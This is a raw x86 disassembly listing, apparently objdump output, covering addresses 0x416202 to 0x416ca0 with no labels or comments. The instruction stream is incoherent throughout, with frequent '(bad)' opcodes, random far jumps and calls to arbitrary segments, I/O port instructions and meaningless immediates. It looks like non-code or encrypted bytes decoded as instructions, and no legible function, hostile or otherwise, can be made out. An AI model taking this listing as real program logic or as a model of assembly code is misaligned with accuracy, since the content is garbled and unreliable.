  416202:	jmp    0x15c1:0xe10d757f
  416209:	mov    cl,BYTE PTR [ecx+ecx*4+0x686e37f]
  416210:	dec    eax
  416211:	push   0xb6c8db77
  416216:	jge    0x416290
  416218:	mov    eax,ds:0xfc69279b
  41621d:	rcl    BYTE PTR ds:0x1771405e,0xaf
  416224:	cs mov ecx,0xe4fe48a0
  41622a:	data16 sbb dh,0x9e
  41622e:	test   BYTE PTR [ebx+0x2b],ah
  416231:	jl     0x4161c9
  416233:	adc    dl,bl
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi-0x36c80922],bh
  4162a4:	loope  0x4162e8
  4162a6:	xchg   ebp,eax
  4162a7:	out    0x0,eax
  4162a9:	add    BYTE PTR [edi],al
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [esi+0x1a],ch
  4162b0:	ds and eax,0xde4938d8
  4162b6:	xor    BYTE PTR [ebp-0x322c332b],ch
  4162bc:	dec    ecx
  4162bd:	and    ah,0xa1
  4162c0:	mov    esp,DWORD PTR [eax]
  4162c2:	scas   eax,DWORD PTR es:[edi]
  4162c3:	call   0x194b01ff
  4162c8:	cmp    BYTE PTR [edi+0x26],cl
  4162cb:	in     al,0x62
  4162cd:	dec    eax
  4162ce:	or     DWORD PTR [edx-0xcbbe2b6],edx
  4162d4:	icebp  
  4162d5:	stc    
  4162d6:	fisttp WORD PTR [ecx+0x5dae47cd]
  4162dc:	pop    ebx
  4162dd:	je     0x41632f
  4162df:	sbb    esi,DWORD PTR [edx+0x7c7a81df]
  4162e5:	aad    0x9a
  4162e7:	or     ecx,0x440ea431
  4162ed:	mov    ebp,0x5124ba02
  4162f2:	push   edi
  4162f3:	xchg   BYTE PTR [eax],ah
  4162f5:	adc    BYTE PTR [ecx-0x74289e06],al
  4162fb:	add    eax,0xc71b95f6
  416300:	dec    ecx
  416301:	out    dx,al
  416302:	sbb    DWORD PTR [edx],edi
  416304:	and    DWORD PTR [eax+0x74],ecx
  416307:	stos   DWORD PTR es:[edi],eax
  416308:	adc    ecx,edi
  41630a:	push   esi
  41630b:	pop    ebx
  41630c:	and    DWORD PTR [esi-0x6678d7a1],edi
  416312:	sbb    ecx,DWORD PTR [ebx-0x3f36653]
  416318:	(bad)
  41631d:	dec    edi
  41631e:	loop   0x4162d7
  416320:	mov    edx,0x4ea71b5d
  416325:	and    edi,edi
  416327:	scas   al,BYTE PTR es:[edi]
  416328:	ret    0x3aa7
  41632b:	icebp  
  41632c:	xor    BYTE PTR [ecx+ebp*4+0x57a7c5ce],cl
  416333:	out    0x67,al
  416335:	dec    ebp
  416336:	loopne 0x4163a4
  416338:	daa    
  416339:	in     eax,dx
  41633a:	(bad)  
  41633b:	les    edi,FWORD PTR [ecx-0x18]
  41633e:	fidivr WORD PTR [edi]
  416340:	(bad)  [eax+0x7f5801a4]
  416346:	iret   
  416347:	push   ds
  416348:	in     eax,0xb5
  41634a:	xor    DWORD PTR [edi-0x504d6fe8],0xe26c4f05
  416354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416355:	pusha  
  416356:	bound  ebx,QWORD PTR [ebx+0xe2405e]
  41635c:	pop    eax
  41635d:	xor    ecx,DWORD PTR [ecx+ecx*8]
  416360:	ds add eax,0x411c2e13
  416366:	sbb    BYTE PTR [ebx-0x63],ch
  416369:	dec    edx
  41636a:	je     0x416315
  41636c:	add    eax,DWORD PTR [ebp+0x7a]
  41636f:	and    DWORD PTR [ebx],ecx
  416371:	xchg   ecx,eax
  416372:	add    BYTE PTR [esi],ah
  416374:	push   ecx
  416375:	in     eax,dx
  416376:	and    al,0x3a
  416378:	pop    ss
  416379:	inc    esi
  41637a:	pop    ds
  41637b:	sbb    eax,0xe6b0261
  416380:	push   cs
  416381:	imul   ebp,esi,0x3a81a90c
  416387:	pop    esi
  416388:	dec    esi
  416389:	fisttp QWORD PTR [ebp-0x73]
  41638c:	mov    edx,0x81f9e552
  416391:	sbb    dl,BYTE PTR [edi+0x75]
  416394:	(bad)  
  416395:	dec    esp
  416396:	mov    WORD PTR [esi+0x58],cs
  416399:	xor    eax,DWORD PTR [ecx+0x3fed66fe]
  41639f:	aad    0x9e
  4163a1:	(bad)  
  4163a2:	mov    ch,0x97
  4163a4:	jo     0x41639d
  4163a6:	aam    0x2f
  4163a8:	pusha  
  4163a9:	adc    BYTE PTR [ebx],ah
  4163ab:	pushf  
  4163ac:	dec    edx
  4163ad:	adc    DWORD PTR [esi-0x6990a7a2],edi
  4163b3:	mul    eax
	...
  416415:	add    bl,dh
  416417:	inc    ebx
  416418:	ror    cl,1
  41641a:	lock (bad) 
  41641d:	jnp    0x416481
  41641f:	xchg   esi,eax
  416420:	cmp    DWORD PTR [ebp-0xffc62b5],edx
  416426:	pushf  
  416427:	call   0x148642c
  41642c:	add    BYTE PTR [eax],al
  41642e:	xchg   esp,eax
  41642f:	inc    ecx
  416430:	(bad)  
  416432:	sti    
  416433:	sub    DWORD PTR [ebp-0x2f],ecx
  416436:	mov    ch,0x61
  416438:	mov    ds:0x616f110f,al
  41643d:	cmp    bl,dh
  41643f:	repnz xor eax,0x16012083
  416445:	and    bl,0xf0
  416448:	cwde   
  416449:	sub    ebx,esp
  41644b:	out    0xfb,al
  41644d:	(bad)  
  41644e:	out    dx,al
  41644f:	gs xchg esi,eax
  416451:	aad    0xdb
  416453:	cdq    
  416454:	jle    0x4164ba
  416456:	(bad)  [esi+0x1a]
  416459:	daa    
  41645a:	sbb    BYTE PTR [esi],dh
  41645c:	jp     0x416489
  41645e:	push   ebp
  41645f:	ret    0xf4c2
  416462:	call   0xe4e8:0xb4433d95
  416469:	std    
  41646a:	mov    esi,DWORD PTR [ebp-0x6e]
  41646d:	sbb    eax,ebx
  41646f:	pop    eax
  416470:	pop    eax
  416471:	cmp    esp,ebp
  416473:	es sub cl,dh
  416476:	inc    edi
  416477:	int3   
  416478:	loopne 0x4164bc
  41647a:	xchg   edi,eax
  41647b:	or     al,BYTE PTR [edx+esi*4]
  41647e:	gs mov esi,0xb97cf547
  416484:	adc    DWORD PTR [edi],esp
  416486:	nop
  416487:	pop    es
  416488:	mov    dl,0x58
  41648a:	call   0x95f4:0x8322b8ee
  416491:	xor    eax,0x6a5f03ef
  416496:	test   al,0x36
  416498:	jae    0x416429
  41649a:	add    eax,DWORD PTR [ecx]
  41649c:	nop
  41649d:	inc    esi
  41649e:	xor    BYTE PTR [edi+0x1edb4aac],ah
  4164a4:	inc    edi
  4164a5:	inc    esi
  4164a6:	mov    bl,0x7e
  4164a8:	xor    DWORD PTR [ecx-0x60],esp
  4164ab:	jmp    0x416450
  4164ad:	jae    0x416430
  4164af:	inc    edi
  4164b0:	(bad)  
  4164b2:	leave  
  4164b3:	or     al,0x10
  4164b5:	fisubr WORD PTR [ebx+eax*1+0x705ba429]
  4164bc:	std    
  4164bd:	cmp    al,BYTE PTR [ecx]
  4164bf:	mov    al,0xdb
  4164c1:	and    ebp,eax
  4164c3:	cmp    bl,BYTE PTR [edx]
  4164c5:	gs push ebp
  4164c7:	shl    dh,1
  4164c9:	ret    
  4164ca:	mov    ecx,0x6d6cbac7
  4164cf:	cmp    bh,bl
  4164d1:	jl     0x41651f
  4164d3:	popf   
  4164d4:	add    eax,0x1631025d
  4164d9:	repz jp 0x41653e
  4164dc:	aaa    
  4164dd:	and    eax,0xbd044390
  4164e2:	inc    eax
  4164e3:	repnz cmp al,0x77
  4164e7:	jnp    0x4164cf
  4164e9:	int    0x83
  4164eb:	jbe    0x41648d
  4164ed:	pop    ebx
  4164ee:	push   ds
  4164ef:	int3   
  4164f0:	jmp    0xb544:0x9d9c6323
  4164f7:	sub    al,0xa3
  4164f9:	and    dh,BYTE PTR [edx]
  4164fb:	pop    eax
  4164fc:	cld    
  4164fd:	clc    
  4164fe:	popa   
  4164ff:	sub    DWORD PTR [ebx+edi*8-0xc864be3],esi
  416506:	pop    ecx
  416507:	es scas eax,DWORD PTR es:[edi]
  416509:	or     eax,DWORD PTR [ebx+edx*8+0x62]
  41650d:	jne    0x4164e5
  41650f:	clc    
  416510:	dec    eax
  416511:	jns    0x4164f3
  416513:	cmp    al,0xc
  416515:	push   ds
  416516:	mov    al,0x26
  416518:	mov    BYTE PTR [ebp+esi*8-0x59],cl
  41651c:	jle    0x41657e
  41651e:	mov    BYTE PTR [edx+0x79],ah
  416521:	mov    edx,0x9e0dd9a4
  416526:	add    dh,bh
  416528:	mov    WORD PTR [ecx+0x42],es
  41652b:	adc    edi,0xffffffef
  41652e:	std    
  41652f:	mov    dl,0x4b
  416531:	xor    al,0x57
  416533:	mov    esi,0x4b
	...
  416594:	add    BYTE PTR [eax],al
  416596:	and    eax,0xfff32bd8
  41659b:	repz std 
  41659d:	fisubr WORD PTR [edi+ebp*1+0x72]
  4165a1:	jno    0x416532
  4165a3:	cld    
  4165a4:	je     0x4165bc
  4165a6:	mov    ds:0x70000e9,eax
  4165ab:	add    DWORD PTR [eax],eax
  4165ad:	add    BYTE PTR [ebp-0x159ffeea],dl
  4165b3:	jp     0x416542
  4165b5:	push   edx
  4165b6:	dec    eax
  4165b7:	je     0x416638
  4165b9:	inc    eax
  4165ba:	pushf  
  4165bb:	mov    cl,0xc5
  4165bd:	es mov edx,ebp
  4165c0:	mov    ds:0x12e5fc,eax
  4165c5:	test   al,0x86
  4165c7:	scas   eax,DWORD PTR es:[edi]
  4165c8:	nop
  4165c9:	xor    edi,DWORD PTR [edi-0x5898e375]
  4165cf:	out    0x5,eax
  4165d1:	mov    al,ds:0xbf7ad2f4
  4165d6:	mov    esp,DWORD PTR [esi+ebp*2]
  4165d9:	ret    
  4165da:	lahf   
  4165db:	push   edi
  4165dc:	add    eax,0x3fdc612e
  4165e1:	push   ebx
  4165e2:	call   0xd53f:0xf298c5c6
  4165e9:	or     eax,0x667e6d4a
  4165ee:	jecxz  0x4165d9
  4165f0:	dec    ebx
  4165f1:	pusha  
  4165f2:	call   0x2137b98
  4165f7:	bnd jg 0x4165bf
  4165fa:	dec    ebx
  4165fb:	add    DWORD PTR [esi],edx
  4165fd:	dec    ebx
  4165fe:	aaa    
  4165ff:	sub    BYTE PTR [ebx+0x78],al
  416602:	inc    ecx
  416603:	push   ebp
  416604:	mov    al,0xfc
  416606:	xchg   edx,eax
  416607:	sub    BYTE PTR [ebp-0x8],ch
  41660a:	out    0xf7,al
  41660c:	jae    0x4165c5
  41660e:	jbe    0x416637
  416610:	xchg   DWORD PTR [esi+0x19ed9e79],ebx
  416616:	stc    
  416617:	mov    esp,0x1fab7b2f
  41661c:	lods   al,BYTE PTR ds:[esi]
  41661d:	and    eax,0x3a542779
  416622:	xchg   DWORD PTR [edx-0x13951673],esp
  416628:	(bad)  
  416629:	mov    ds:0x921030f1,eax
  41662e:	aaa    
  41662f:	cmp    ecx,DWORD PTR [esi]
  416631:	test   DWORD PTR [edi+0x47],ecx
  416634:	in     al,dx
  416635:	call   0x41b5:0xfd660659
  41663c:	imul   eax,DWORD PTR [edi+eiz*8+0x526f99d9],0x54240c8f
  416647:	es pop ss
  416649:	jb     0x41667d
  41664b:	test   BYTE PTR [eax+0x4],0x5c
  41664f:	repz int3 
  416651:	imul   ebx,DWORD PTR [edx+0x57fa60b0],0xffffff95
  416658:	and    ch,BYTE PTR [ecx+0x72]
  41665b:	outs   dx,DWORD PTR ds:[esi]
  41665c:	(bad)  
  41665d:	ins    BYTE PTR es:[edi],dx
  41665e:	ds retf 
  416660:	push   0x64720423
  416665:	in     eax,dx
  416666:	cld    
  416667:	sti    
  416668:	cmp    esp,DWORD PTR [ebx]
  41666a:	pusha  
  41666b:	std    
  41666c:	lea    esi,[esp+ebp*4]
  41666f:	int    0x65
  416671:	cmp    bl,BYTE PTR [ebp+esi*2-0x1806f593]
  416678:	ins    BYTE PTR es:[edi],dx
  416679:	jne    0x41666a
  41667b:	dec    eax
  41667c:	dec    eax
  41667d:	mov    dl,0xe
  41667f:	out    dx,eax
  416680:	test   eax,0xfd66baf
  416685:	gs pop edi
  416687:	in     al,dx
  416688:	push   edi
  416689:	sub    eax,0xcc391d37
  41668e:	or     BYTE PTR [edx],al
  416690:	xlat   BYTE PTR ds:[ebx]
  416692:	test   eax,0x2fd7d7cc
  416697:	xchg   ebp,eax
  416698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416699:	sbb    bl,BYTE PTR [ebx+0x31]
  41669c:	lods   eax,DWORD PTR ds:[esi]
  41669d:	dec    ebx
  41669e:	addr16 mov eax,0xab6cb882
  4166a4:	cli    
  4166a5:	jns    0x416675
  4166a7:	jno    0x416642
  4166a9:	add    ecx,DWORD PTR [ecx+0x3749fb8f]
  4166af:	cld    
  4166b0:	(bad)  
  4166b1:	scas   eax,DWORD PTR es:[edi]
  4166b2:	cmp    DWORD PTR [eax+0xdb],0x0
	...
  416715:	add    ah,al
  416717:	(bad)  
  416719:	(bad)  
  41671a:	(bad)  
  41671c:	out    0xff,eax
  41671e:	mov    ah,0x10
  416720:	mov    cl,0x4f
  416722:	out    dx,eax
  416723:	dec    edi
  416724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416725:	ja     0x4166d1
  416727:	jmp    0x0:0x1070000
  41672e:	mov    DWORD PTR [ebp-0x2aa19456],esp
  416734:	cwde   
  416735:	mov    ds:0xf1ecced3,al
  41673a:	retf   
  41673b:	xchg   bh,bh
  41673d:	add    DWORD PTR [esi+ebp*1],ebx
  416740:	cmp    al,0xa1
  416742:	loope  0x416735
  416744:	sub    eax,0xb3ba6245
  416749:	inc    esp
  41674a:	xchg   edi,eax
  41674b:	mov    al,ds:0x12c1caa5
  416750:	cmp    DWORD PTR [ebx+0x7267ff49],0x5f01abd5
  41675a:	pop    esp
  41675b:	jecxz  0x41672b
  41675d:	mov    ds:0xff7cd127,al
  416762:	arpl   si,cx
  416764:	jmp    0xe443:0x24b18142
  41676b:	daa    
  41676c:	pusha  
  41676d:	frstor [ecx]
  41676f:	dec    eax
  416770:	mov    ebx,0x450deb36
  416775:	ja     0x416783
  416777:	sub    eax,0xf889180d
  41677c:	mov    ah,0x64
  41677e:	test   ecx,eax
  416780:	mov    DWORD PTR [edx+0x31],eax
  416783:	mov    al,0x21
  416785:	xchg   ebp,eax
  416786:	push   0xdb09ef96
  41678b:	mov    ebp,0x542cc9bf
  416790:	push   es
  416791:	lds    edx,FWORD PTR [edx+0x3c8e33be]
  416797:	adc    DWORD PTR [esi-0x66],esi
  41679a:	ins    BYTE PTR es:[edi],dx
  41679b:	sbb    al,0xe6
  41679d:	mov    ch,BYTE PTR [edi-0x623fd30a]
  4167a3:	pop    edi
  4167a4:	loop   0x4167b0
  4167a6:	mov    eax,0x17d2e6c0
  4167ab:	jno    0x4167e1
  4167ad:	pop    ecx
  4167ae:	adc    al,0x52
  4167b0:	and    ch,dl
  4167b2:	js     0x41675d
  4167b4:	sbb    edx,DWORD PTR [edi]
  4167b6:	sub    DWORD PTR [edi-0x70],edx
  4167b9:	mov    esp,0x8b98ca28
  4167be:	and    al,0xc4
  4167c0:	scas   al,BYTE PTR es:[edi]
  4167c1:	and    dl,BYTE PTR [esp+esi*1-0x6d325ee7]
  4167c8:	popf   
  4167c9:	adc    ch,dl
  4167cb:	mov    esp,0x5b85af07
  4167d0:	sub    bl,BYTE PTR [ebx]
  4167d2:	jb     0x41680e
  4167d4:	sbb    dl,BYTE PTR [ebp-0x6248e2e7]
  4167da:	in     eax,0xda
  4167dc:	mov    esp,0xb3cc70f7
  4167e1:	lods   al,BYTE PTR ds:[esi]
  4167e2:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4167e4:	sub    BYTE PTR [ecx-0x4b],cl
  4167e7:	lods   eax,DWORD PTR ds:[esi]
  4167e8:	sbb    DWORD PTR [ecx],ecx
  4167ea:	xor    BYTE PTR [ecx-0x1db65d65],al
  4167f0:	outs   dx,DWORD PTR ds:[esi]
  4167f1:	inc    esp
  4167f2:	mov    bh,0x2e
  4167f4:	xchg   edi,eax
  4167f5:	in     al,dx
  4167f6:	mov    eax,0x2dc1b74c
  4167fb:	cmp    BYTE PTR [esi+ecx*1+0x3d8e0ddc],ch
  416802:	das    
  416803:	xchg   ecx,eax
  416804:	mov    DWORD PTR [ecx],0x5643708b
  41680a:	pop    ebx
  41680b:	push   ebx
  41680c:	adc    bh,BYTE PTR [ecx+0x7e]
  41680f:	push   ss
  416810:	out    0x87,al
  416812:	jns    0x41681d
  416814:	loopne 0x416805
  416816:	adc    al,0x4a
  416818:	cmp    BYTE PTR ds:0xea6b1747,0x28
  41681f:	jecxz  0x4167da
  416821:	sbb    DWORD PTR [edi+0x2895208c],ecx
  416827:	jmp    0xc97b7cb5
  41682c:	mov    edi,0x5371695a
  416831:	stos   DWORD PTR es:[edi],eax
  416832:	mov    cl,0x41
  416834:	les    eax,FWORD PTR [eax]
	...
  416896:	shr    DWORD PTR [edi-0x4810cfa],1
  41689c:	cmc    
  41689d:	scas   eax,DWORD PTR es:[edi]
  41689e:	cwde   
  41689f:	sub    bh,al
  4168a1:	repnz repz push edi
  4168a4:	mov    eax,0xebb19e
  4168a9:	add    BYTE PTR [edi],al
  4168ab:	add    DWORD PTR [eax],eax
  4168ad:	add    BYTE PTR [esi-0x68],ah
  4168b0:	cmp    ch,BYTE PTR [ebx-0x126df47e]
  4168b6:	or     al,0xed
  4168b8:	dec    esp
  4168b9:	push   ds
  4168ba:	outs   dx,DWORD PTR ds:[esi]
  4168bb:	mov    dl,0xb0
  4168bd:	mov    ebp,0x581206fd
  4168c2:	sbb    esi,ebx
  4168c4:	aaa    
  4168c5:	cmp    ch,BYTE PTR es:[edi-0x7b]
  4168c9:	xor    esi,0xffffffe2
  4168cc:	inc    esp
  4168cd:	(bad)  
  4168ce:	loopne 0x41690e
  4168d0:	sbb    eax,0x4901be63
  4168d5:	and    DWORD PTR [eax+ecx*2-0x3e935030],esp
  4168dc:	aas    
  4168dd:	loopne 0x4168a8
  4168df:	jg     0x416873
  4168e1:	mov    WORD PTR [esi-0x60],?
  4168e4:	out    0xd5,al
  4168e6:	pushf  
  4168e7:	add    eax,0x867310c2
  4168ec:	loop   0x416894
  4168ee:	xchg   ecx,eax
  4168ef:	mov    ebx,0x780006a5
  4168f4:	stos   BYTE PTR es:[edi],al
  4168f5:	sahf   
  4168f6:	fmul   st(1),st
  4168f8:	sbb    eax,0x9c53e2cd
  4168fd:	dec    esp
  4168fe:	sahf   
  4168ff:	and    al,0x80
  416901:	xchg   edx,eax
  416902:	xor    cl,BYTE PTR ds:0x6d13d070
  416908:	sbb    esi,DWORD PTR [edi]
  41690a:	cmp    ecx,esp
  41690c:	and    DWORD PTR [ecx+ebx*8],ecx
  41690f:	jb     0x41694d
  416911:	or     ebp,DWORD PTR [esi+ebp*4-0x1ec80554]
  416918:	sbb    dl,BYTE PTR [ebx+0x48]
  41691b:	or     al,BYTE PTR [esi-0x64]
  41691e:	mov    dh,0xb7
  416920:	and    al,0xba
  416922:	mov    ds:0x5395e6e3,eax
  416927:	cld    
  416928:	test   BYTE PTR [ebx-0x59],ah
  41692b:	dec    ebx
  41692c:	push   ebx
  41692d:	inc    ebp
  41692e:	jo     0x4168db
  416930:	in     al,dx
  416931:	(bad)  
  416932:	ficom  WORD PTR [eax+0x27]
  416935:	xor    eax,0x919672e7
  41693a:	lds    edx,FWORD PTR [ebx+0x1a]
  41693d:	jp     0x416916
  41693f:	cli    
  416940:	sar    BYTE PTR [eax],cl
  416942:	or     DWORD PTR [ecx-0x5a],0xeb3e87f5
  416949:	dec    ecx
  41694a:	and    al,0x46
  41694d:	inc    ebx
  41694e:	leave  
  41694f:	cmp    eax,0x2fc40ab7
  416954:	cmp    dl,BYTE PTR [esi-0x5ca099a5]
  41695a:	lahf   
  41695b:	ficom  WORD PTR ds:0x32690da
  416961:	or     bl,BYTE PTR [ebx+0x38]
  416964:	sub    cl,cl
  416966:	adc    al,BYTE PTR [ecx]
  416968:	dec    esp
  416969:	add    BYTE PTR [ebx+0x6a4d3b62],ah
  41696f:	loopne 0x416998
  416971:	pop    ebp
  416972:	jmp    0x16a2:0xde0da44c
  416979:	xchg   esp,eax
  41697a:	ss mov ch,0xb4
  41697d:	adc    ch,dh
  41697f:	adc    al,0x13
  416981:	fcom   QWORD PTR [ebx+0x16084341]
  416987:	jmp    0x1289:0xa92060b8
  41698e:	add    DWORD PTR [ecx+0x6cce81f5],esp
  416994:	in     al,0x76
  416996:	mov    ?,edx
  416998:	ins    BYTE PTR es:[edi],dx
  416999:	xor    al,0x93
  41699b:	sbb    ecx,DWORD PTR [ebp-0xf]
  41699e:	push   ss
  41699f:	cmp    DWORD PTR [eax],ebx
  4169a1:	lahf   
  4169a2:	nop
  4169a3:	mov    esi,0x67d09f4
  4169a8:	add    eax,0xe32b2a72
  4169ad:	jmpw   0x3f1f
  4169b1:	aam    0xde
  4169b3:	lods   eax,DWORD PTR ds:[esi]
  4169b4:	sub    al,BYTE PTR [eax]
	...
  416a16:	retf   
  416a17:	pusha  
  416a18:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a1e:	enter  0x4aea,0x13
  416a22:	sbb    edx,DWORD PTR [esi-0x13476552]
  416a28:	add    BYTE PTR [eax],al
  416a2a:	pop    es
  416a2b:	add    DWORD PTR [eax],eax
  416a2d:	add    BYTE PTR [edx],dl
  416a2f:	cld    
  416a30:	cmp    al,0x1b
  416a32:	jns    0x416a96
  416a34:	out    0x4c,eax
  416a36:	push   esp
  416a37:	xchg   ebp,eax
  416a38:	sub    eax,0x923b3722
  416a3d:	xchg   ebx,eax
  416a3e:	les    ecx,FWORD PTR [eax]
  416a40:	sbb    BYTE PTR [eax],bh
  416a42:	cwde   
  416a43:	cli    
  416a44:	iret   
  416a45:	mov    ebp,ebp
  416a47:	jp     0x416a9c
  416a49:	lock ins BYTE PTR es:[edi],dx
  416a4b:	div    DWORD PTR ds:0xee6a680f
  416a51:	aas    
  416a52:	test   eax,0x13ae743f
  416a57:	pop    ss
  416a58:	sbb    BYTE PTR [ebx],0x15
  416a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a5c:	and    al,0xf
  416a5e:	mov    ch,0x34
  416a60:	retf   
  416a61:	jno    0x416a06
  416a63:	rcl    ch,1
  416a65:	(bad)  
  416a66:	jp     0x416aa9
  416a68:	mov    WORD PTR [edx-0x4b],?
  416a6b:	sub    BYTE PTR [esi],bh
  416a6d:	lahf   
  416a6e:	mov    esp,0xc2000bd0
  416a73:	add    BYTE PTR [esp+eiz*8+0x38],0x40
  416a78:	loop   0x416ac6
  416a7a:	pusha  
  416a7b:	int3   
  416a7c:	gs cmp bl,ch
  416a7f:	cli    
  416a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a81:	mov    ah,0x5b
  416a83:	mov    cl,0xe
  416a85:	mov    ch,0x76
  416a87:	loop   0x416a43
  416a89:	push   es
  416a8a:	adc    al,0x75
  416a8c:	pushf  
  416a8d:	cmc    
  416a8e:	or     BYTE PTR [edx-0x49a0e149],0xb0
  416a95:	inc    esi
  416a96:	jl     0x416a2d
  416a98:	and    ebx,esi
  416a9a:	iret   
  416a9b:	repz sub edi,ecx
  416a9e:	push   eax
  416a9f:	sub    al,0xb8
  416aa1:	and    bh,cl
  416aa3:	fisttp QWORD PTR [eax]
  416aa5:	push   ebx
  416aa6:	ds jns 0x416af4
  416aa9:	pop    ebx
  416aaa:	dec    eax
  416aab:	fist   DWORD PTR [eax-0x52]
  416aae:	xchg   BYTE PTR ds:0x78dd7db5,bl
  416ab4:	js     0x416a90
  416ab6:	push   edx
  416ab7:	sbb    al,dl
  416ab9:	xor    al,0x67
  416abb:	in     al,dx
  416abc:	push   ss
  416abd:	xchg   ebx,eax
  416abe:	jp     0x416a6b
  416ac0:	push   esp
  416ac1:	addr16 push edi
  416ac3:	mov    bl,0x4f
  416ac5:	or     al,0xd8
  416ac7:	adc    BYTE PTR [ebx+0x35578512],bl
  416acd:	test   eax,0x4a5fb77b
  416ad2:	rcr    BYTE PTR ds:0xbf485c,1
  416ad8:	retf   
  416ad9:	mov    esi,0x47396e0f
  416ade:	gs jmp 0x1391631c
  416ae4:	fdivr  st(3),st
  416ae6:	fstp   QWORD PTR [ecx-0x30e0628e]
  416aec:	and    bl,BYTE PTR [edi+0x9]
  416aef:	icebp  
  416af0:	aad    0x70
  416af2:	imul   BYTE PTR [edx-0x6b]
  416af5:	adc    al,0xae
  416af7:	sbb    al,0x54
  416af9:	enter  0x6f95,0xfb
  416afd:	mov    dl,0xfb
  416aff:	(bad)  
  416b00:	js     0x416b3f
  416b02:	(bad)  
  416b03:	jecxz  0x416ae9
  416b05:	nop
  416b06:	ret    0x8b92
  416b09:	cmp    al,0x44
  416b0b:	into   
  416b0c:	repz dec esp
  416b0e:	sbb    al,0xe5
  416b10:	cmc    
  416b11:	add    BYTE PTR [eax+0x7e],dh
  416b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b15:	xor    eax,0xfacc8686
  416b1a:	xor    al,0xa3
  416b1c:	retf   
  416b1d:	xchg   esi,eax
  416b1e:	sbb    al,0x3e
  416b20:	aas    
  416b21:	es sti 
  416b23:	add    BYTE PTR [edi*4-0x43e2c792],dl
  416b2a:	push   ebx
  416b2b:	outs   dx,DWORD PTR ds:[esi]
  416b2c:	push   es
  416b2d:	lahf   
  416b2e:	das    
  416b2f:	or     DWORD PTR [esi],esp
  416b31:	ins    DWORD PTR es:[edi],dx
  416b32:	mov    edi,DWORD PTR [ebx+0x8]
	...
  416b95:	add    bl,ah
  416b97:	gs push cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0xf8a56b6b
  416ba3:	jno    0x416b9d
  416ba5:	sbb    DWORD PTR [edi+0x70000ed],edi
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [ebx],bh
  416baf:	cmp    al,BYTE PTR [eax]
  416bb1:	sar    DWORD PTR [ebp-0x3b],cl
  416bb4:	ins    DWORD PTR es:[edi],dx
  416bb5:	lea    ebx,[ebx+edx*1+0x12]
  416bb9:	mov    al,ds:0x5c3dc184
  416bbe:	push   ebp
  416bbf:	xchg   esi,eax
  416bc0:	retf   
  416bc1:	xchg   BYTE PTR ss:[si-0x3105],dl
  416bc7:	iret   
  416bc8:	adc    DWORD PTR [edx+0x29],ecx
  416bcb:	inc    eax
  416bcc:	inc    ebp
  416bcd:	call   0x4f230a36
  416bd2:	pop    esi
  416bd3:	outs   dx,DWORD PTR ds:[esi]
  416bd4:	leave  
  416bd5:	sbb    BYTE PTR [ebp-0x2a725047],al
  416bdb:	xor    eax,esp
  416bdd:	dec    esi
  416bde:	or     ebx,ecx
  416be0:	jle    0x416c36
  416be2:	jb     0x416bb6
  416be4:	pushf  
  416be5:	add    al,0xe0
  416be7:	cmp    esp,DWORD PTR [edx+0x57407ce5]
  416bed:	mov    WORD PTR [edx],ds
  416bef:	dec    edx
  416bf0:	repz adc DWORD PTR gs:[ebp+0x744f4992],esi
  416bf8:	fnsave [ecx+0x46579c5f]
  416bfe:	pop    esp
  416bff:	arpl   sp,cx
  416c01:	ins    DWORD PTR es:[edi],dx
  416c02:	gs xchg ecx,eax
  416c04:	out    dx,al
  416c05:	call   0x4d7b:0x11f095c6
  416c0c:	icebp  
  416c0d:	xchg   esp,eax
  416c0e:	out    0x8a,al
  416c10:	mov    ebx,0x88aa4c12
  416c15:	icebp  
  416c16:	xor    BYTE PTR [ebx-0x7c2f18d9],dl
  416c1c:	bound  ebx,QWORD PTR [eax+0x78]
  416c1f:	cwde   
  416c20:	mov    edi,DWORD PTR [ecx+0x4a]
  416c23:	stc    
  416c24:	jmp    0xc5b9:0x30552778
  416c2b:	sub    bl,BYTE PTR [eax+0x6a]
  416c2e:	inc    ebx
  416c2f:	addr16 aad 0x6d
  416c32:	in     al,dx
  416c33:	rol    BYTE PTR [esi+ebx*8],1
  416c36:	cmp    DWORD PTR [eax+0xc58314b],ebp
  416c3c:	and    DWORD PTR [ecx-0x27],edx
  416c3f:	into   
  416c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c41:	or     DWORD PTR [ecx-0x653d07f4],edi
  416c47:	cmp    BYTE PTR [eax+esi*2+0x41],0xb
  416c4c:	mov    ebp,0xc7c0feb4
  416c51:	mov    eax,ds
  416c53:	mov    al,ds:0xb305680c
  416c58:	imul   edx,DWORD PTR [ebx+0x7018f7e1],0x31a39577
  416c62:	sub    bl,BYTE PTR [edi]
  416c64:	in     al,dx
  416c65:	cs dec esi
  416c67:	fwait
  416c68:	ss into 
  416c6a:	es xor edi,esp
  416c6d:	fsubp  st(7),st
  416c6f:	jmp    0x416c82
  416c71:	mov    edi,DWORD PTR [ebx-0x48]
  416c74:	in     eax,0xa2
  416c76:	cs push edx
  416c78:	in     eax,0xf8
  416c7a:	popf   
  416c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c7c:	xchg   ecx,eax
  416c7d:	les    ebx,FWORD PTR [ecx]
  416c7f:	cwde   
  416c80:	push   esi
  416c81:	fdivr  st,st(2)
  416c83:	(bad)  
  416c84:	jae    0x416c73
  416c86:	mov    es,WORD PTR [eax+0x63]
  416c89:	hlt    
  416c8a:	(bad)  
  416c8b:	and    al,0x29
  416c8d:	or     bl,BYTE PTR [esi]
  416c8f:	sbb    eax,0xc444b5d8
  416c94:	test   DWORD PTR [edx],ebp
  416c96:	push   esi
  416c97:	fdivr  QWORD PTR [edi-0x59]
  416c9a:	and    eax,0x8fad7605
  416c9f:	cli    
  416ca0:	hlt    
